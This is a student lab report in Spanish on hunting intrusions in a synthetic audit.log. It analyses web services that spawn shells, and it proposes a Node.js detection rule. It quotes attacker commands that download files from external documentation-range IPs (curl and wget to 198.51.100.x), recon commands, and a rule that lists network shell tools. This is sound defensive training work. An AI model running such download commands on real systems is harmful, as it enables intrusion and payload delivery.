# Detección y caza — Grupo 04

**Integrantes:** Lorenzo Bellomo (análisis), Agustin Ignacio Kloster (revisión, 30/10) · **Fecha:** jueves 29/10/2026

Fuente: `laboratorio/logs/audit.log` (21 líneas, 2026-10-27 09:40–09:49 UTC).
Filtro inicial con `./scripts/detectar.sh`
([`capturas/02-detectar.txt`](capturas/02-detectar.txt)), que busca padres
`apache2|php-fpm|node|python` con hijos `sh|bash|curl|wget|nc`. Después se leyó el log
completo para ver la cadena de cada caso y las líneas que el filtro no cubre.

---

## 1. Hipótesis de caza

Si PHP2Shell o Node2Shell se explotaron, en web01 (PHP), api01 (Node) o svc01 (Python)
vamos a ver al **proceso del servicio** (`apache2`, `node`, `python`) como **padre** de
un **shell o descargador** (`sh`, `bash`, `curl`, `wget`, `nc`), a partir del 17/10
(primer intento visto) y sobre todo después del 21/10, con argumentos de
reconocimiento (`id`, `whoami`, `uname`) o URLs a IPs externas.

---

## 2. Hallazgos en `audit.log`

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|---|---|
| 2026-10-27T09:42:17Z (pid 903) y 09:42:18Z (pid 904) | web01 | `apache2` (812) → `sh -c id` → `id` | **Sí** | Un worker de Apache con mod_php no lanza shells. `id` es el primer comando que corre un atacante para saber con qué usuario ejecuta. Coincide con PHP2Shell en mod_php |
| 2026-10-27T09:43:03Z (pid 601) y 09:43:04Z (pid 602) | api01 | `node` (501) → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | `server.js` no usa `child_process`: no hay motivo legítimo para que `node` cree un shell. Descarga un archivo (`/x`) desde una IP externa. Coincide con Node2Shell |
| 2026-10-27T09:44:22Z (pid 906) | web01 | `apache2` (812) → `wget http://198.51.100.9/a` | **Sí** | Segunda acción en web01, ahora descarga directa sin shell intermedio, desde otra IP del mismo rango |
| 2026-10-27T09:45:10Z (pid 704) y 09:45:11Z (pid 705) | svc01 | `python` (701) → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento del sistema en el servicio **interno**, que no recibe tráfico de Internet. Sugiere que el atacante ya estaba adentro y se movió lateralmente |
| 09:42:40Z (1002), 09:44:10Z (1003), 09:49:00Z (1004) | db01 | `sshd` (1001) → `-bash` | Indeterminado | Sesiones SSH interactivas. Pueden ser de un administrador, pero ocurren dentro de la ventana del ataque y db01 no figura en el inventario |
| 09:41:12Z, 09:45:00Z, 09:47:00Z | api01 | `node` (501) → `node server.js` | Baja, a confirmar | Mismo binario y mismos argumentos que el servicio: compatible con un supervisor que reinicia la app. Pero rodean al `curl` de 09:43:03 (ver 2.2) |
| 09:41:30Z, 09:43:40Z | svc01 | `python` (701) → `python app.py` | Baja, a confirmar | Igual que el caso anterior; el de 09:43:40 precede en 90 s al `uname` (ver 2.2) |
| 09:40:01Z … 09:48:00Z | web01 | `apache2` (812) → `apache2 -k start` | No | Comportamiento normal: el master de Apache crea workers |

**¿Hay compromiso?** **Sí** en web01, api01 y svc01, con **alcance indeterminado**.

- Lo que lo sostiene: tres servicios distintos ejecutan comandos que su código nunca
  ejecuta, en una ventana de 3 minutos (09:42:17–09:45:11), con una secuencia típica
  de post-explotación automatizada: identidad (`id`) → descarga (`curl`) → descarga
  (`wget`) → reconocimiento (`uname`). Las dos IPs externas son del mismo rango
  (198.51.100.0/24).
- Lo que no sabemos: si las descargas tuvieron éxito, qué se ejecutó después, si hubo
  persistencia, ni quién abrió las sesiones de db01. Con estas líneas no se puede
  confirmar el vector exacto (PHP2Shell, Node2Shell u otro), solo que los procesos de
  los servicios ejecutaron comandos.
- Decisión: tratarlo como incidente en web01, api01 y svc01 (aislar, preservar
  evidencia, rotar secretos que esos servicios tengan), e investigar db01.

### 2.1. De qué proceso cuelgan los hallazgos

En los tres hosts, el proceso sospechoso tiene como padre el **mismo PID que crea las
instancias del servicio**:

| Host | PID padre | Qué más crea ese PID | Hallazgo |
|---|---|---|---|
| web01 | 812 | los workers `apache2 -k start` (900–908) | `sh -c id`, `wget` |
| api01 | 501 | las instancias `node server.js` (600, 603, 604) | `sh -c curl …` |
| svc01 | 701 | las instancias `python app.py` (702, 703) | `sh -c uname -a` |

Con mod_php, el código PHP corre en los **workers**. Un shell disparado por PHP2Shell
debería colgar de un worker (900–908), no del master 812. Hay dos lecturas:

- El log simplifica el árbol y atribuye todo al proceso principal (es sintético).
- La ejecución ocurrió en el **master** de Apache. En el lab, el master corre como
  **root** ([`capturas/02-detectar.txt`](capturas/02-detectar.txt)); los workers,
  como `www-data`. Si el log es fiel, el impacto en web01 es mayor que el que
  asumimos.

Sin UID en el log (sección 5) no se puede decidir entre las dos. Para la regla de la
sección 4 deja una lección: conviene evaluar la **ascendencia** del proceso (algún
ancestro `node`), no solo el padre directo, porque el árbol real puede tener
intermediarios.

### 2.2. Reinicios cerca de los hallazgos

Los relanzamientos de `node server.js` y `python app.py` los marcamos de baja
prioridad, pero merecen una segunda lectura. Node2Shell es una escritura fuera de
rango y PHP2Shell parte de un OOM o error fatal. Un **intento fallido** de cualquiera
de los dos típicamente **tira el proceso** y el supervisor lo relanza.

- svc01: reinicio a las 09:43:40, `uname -a` a las 09:45:10 (90 s después).
- api01: el `curl` de 09:43:03 queda entre los reinicios de 09:41:12 y 09:45:00.

Hay una explicación alternativa: la cadencia es casi exacta (api01 a las 09:45:00 y
09:47:00; workers de web01 a las 09:42:01, 09:44:00, 09:46:00 y 09:48:00) y se parece
más a un reciclado programado que a crashes. El log no trae lo necesario para
distinguirlas: el **código de salida o la señal** con que terminó la instancia
anterior (SIGSEGV/SIGABRT frente a salida limpia), los eventos de OOM-kill del kernel
y los logs de la app.

**Mejora de detección:** alertar por reinicios de `node`, `python` o de workers de
Apache que terminen por señal de crash. Cubre en parte el falso negativo "payload en
memoria" de la sección 4: el intento exitoso puede no crear procesos, pero los
fallidos suelen dejar rastro.

---

## 3. Falsos positivos

- **`sshd` → `-bash` en db01.** El guion inicial (`-bash`) indica un shell de login: es
  lo que se ve cuando una persona entra por SSH. Puede ser un administrador
  revisando la base durante el incidente. Para distinguirlo hace falta lo que el log
  no trae: usuario, IP de origen, método de autenticación (clave o contraseña) y si
  ese usuario suele entrar a esa hora. Si fue alguien del equipo, se descarta con
  el registro de cambios o preguntando; si no, es el pivote más grave del log.
- **`node` → `node server.js` y `python` → `python app.py`.** A primera vista "el
  servicio lanzando procesos" parece la misma señal que los hallazgos, pero el hijo
  es el propio servicio con sus argumentos normales. Una regla que alerte por
  cualquier hijo de `node` los marcaría; por eso la regla de la sección 4 filtra por
  el binario hijo.
- **Healthcheck de Docker en el lab.** `docker top node-lab` muestra
  `node -e fetch('http://127.0.0.1:3000/')…` cada 5 s. Parece un `node` ejecutando
  código arbitrario, pero es el healthcheck del compose y su padre es el runtime del
  contenedor, no `node server.js`
  ([`capturas/07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)).

---

## 4. Regla propuesta para Node.js

**Qué observa:** eventos de creación de procesos (`execve`) en el host o contenedor
de la API, con el nombre del proceso padre y del hijo, como los de `audit.log`.

**Condición que dispara:**

```text
host = api01
AND ppid_comm = node
AND comm IN (sh, bash, dash, ash, curl, wget, nc, ncat, python, perl)
→ severidad crítica: alerta inmediata + aislar el contenedor + preservar evidencia
```

Sobre `audit.log` es el filtro de `detectar.sh` restringido a Node; dispara con la
línea de 2026-10-27T09:43:03Z (`node` → `sh -c curl http://198.51.100.7/x`).

**Por qué sin excepciones:** `server.js` solo responde JSON y descomprime Brotli; no
usa `child_process`. Cualquier hijo distinto de `node server.js` es anómalo. Si en
el futuro la app necesitara lanzar procesos, se agrega una excepción explícita por
ruta y argumentos, no por nombre.

**Falsos negativos que puede tener:**

- **Payload en memoria:** Node2Shell es una escritura fuera de rango en el decoder; un
  exploit puede descargar y ejecutar con `fetch`, `net` o `vm` de Node **sin crear
  ningún proceso**. La regla no ve nada. Para eso hace falta telemetría de red
  (conexiones salientes de `node`) o de comportamiento.
- **Binario renombrado o no listado:** `busybox`, `/tmp/x`, `node -e …` (un hijo
  `node` con argumentos distintos de `server.js`). Mejora: alertar por cualquier
  hijo que no sea exactamente `node server.js`.
- **Cadenas largas:** `node` → `python` → `sh`; la regla ve el primer salto solo si
  `python` está en la lista. Mejora: evaluar la ascendencia completa (algún ancestro
  `node`) en lugar del padre directo (ver 2.1).
- **Intentos fallidos:** un exploit que crashea `node` sin llegar a ejecutar nada no
  crea hijos. Se cubre con la alerta de reinicios por crash de la sección 2.2.
- **Procesos muy cortos:** si la telemetría muestrea (como `docker top`) en vez de
  registrar cada `execve`, un `curl` de un segundo se pierde.

---

## 5. Limitaciones del log

- **Sin usuario/UID:** no se sabe si `sh` corrió como `www-data`, `node` o root, ni
  quién abrió las sesiones SSH en db01.
- **Sin IP de origen:** no se puede vincular cada proceso con la petición HTTP que lo
  disparó ni con una IP atacante; tampoco distinguir un admin de un intruso en db01.
- **Sin resultado:** no hay código de salida, bytes descargados ni archivos creados;
  no sabemos si `curl`/`wget` funcionaron.
- **Retención y cobertura:** cubre 9 minutos del 27/10. No hay nada del 17/10 al
  27/10, cuando ya había intentos de explotación, ni después de las 09:49.
- **Sin telemetría de red:** no hay registro de conexiones a 198.51.100.7 y
  198.51.100.9 ni del tráfico entre hosts (necesario para confirmar el movimiento
  lateral hacia svc01 y db01).
- **Sin hash ni ruta completa** del binario: un `sh` falso o renombrado se vería igual.
- **Hosts sin contexto:** db01 aparece en el log pero no en nuestro inventario.
- **Log sintético:** es un ejercicio; las IPs son de un rango de documentación y los
  PIDs no corresponden al laboratorio que levantamos.
